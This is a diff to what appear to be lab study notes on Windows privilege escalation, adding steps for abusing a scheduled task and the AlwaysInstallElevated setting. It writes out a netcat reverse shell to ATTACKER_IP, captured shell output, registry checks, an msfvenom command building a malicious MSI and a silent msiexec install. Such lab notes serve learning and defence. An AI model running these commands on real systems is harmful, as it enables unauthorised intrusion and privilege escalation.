@@ -141,10 +141,41 @@ echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
 * Start listener on attacker machine.
 ```
 nc -lvnp 4444
+Listening on 0.0.0.0 4444
 ```
-* 
-## AlwaysInstallElevated
+* Attacker will recieve reverse shell with taskusr1 privileges when sheduled task next runs.
+* Start task manually (if current user has permissions).
+```
+schtasks /run /tn vulntask
+```
+* Attacker will immediately receive the reverse shell.
+```
+Connection received on 10.10.175.90 50649
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
 
+C:\Windows\system32>whoami
+wprivesc1\taskusr1
+```
+## AlwaysInstallElevated
+* Windows installer files (.msi) usually run with privilege level of user that executed it.
+  * Can be configured to run with higher privileges.
+* Generate malicious MSI file that runs with admin privileges.
+* Requires two registry values to be set to exploit the vulnerabilty.
+```
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
+* Generate MSI reverse shell file using `msfvenom`.
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.189.232 LPORT=LOCAL_PORT -f msi -o malicious.msi
+```
+* Transfer malicious file to target.
+* Run properly configured Metasploit handler module on attacking machine.
+* Run installer on target to receive the reverse shell.
+```
+msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+```
 # Abusing Service Misconfigurations
 
 
